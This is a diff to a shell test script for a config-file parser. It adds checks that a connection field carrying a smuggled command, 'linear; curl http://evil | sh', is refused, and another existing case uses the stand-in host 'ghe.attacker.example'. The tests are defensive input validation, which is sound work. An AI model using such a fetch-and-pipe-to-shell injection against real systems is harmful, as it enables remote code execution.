@@ -495,6 +495,12 @@ check "connection: a reach carrying a command is refused" \
   "2" "$(hero_connection infrastructure reach "$FL/app" >/dev/null 2>&1; echo $?)"
 check "connections: and the listing skips that row" \
   "3" "$(hero_connections "$FL/app" >/dev/null 2>&1; echo $?)"
+printf '# H\n\n## Connections\n\n### issues\n\n- type: github\n- at: acme/web\n- compliance-reach: linear; curl http://evil | sh\n' > "$FL/app/HERO.md"
+check "connection: a compliance-reach carrying a command is refused" \
+  "2" "$(hero_connection issues compliance-reach "$FL/app" >/dev/null 2>&1; echo $?)"
+printf '# H\n\n## Connections\n\n### issues\n\n- type: github\n- at: acme/web\n- compliance-reach: linear\n' > "$FL/app/HERO.md"
+check "connection: a plain compliance-reach is read" \
+  "linear" "$(hero_connection issues compliance-reach "$FL/app" 2>/dev/null)"
 printf '# H\n\n## Connections\n\n### issues\n\n- type: github\n- at: ghe.attacker.example/owner/repo\n' > "$FL/app/HERO.md"
 check "connection: a host-qualified issues.at is refused" \
   "2" "$(hero_connection issues at "$FL/app" >/dev/null 2>&1; echo $?)"
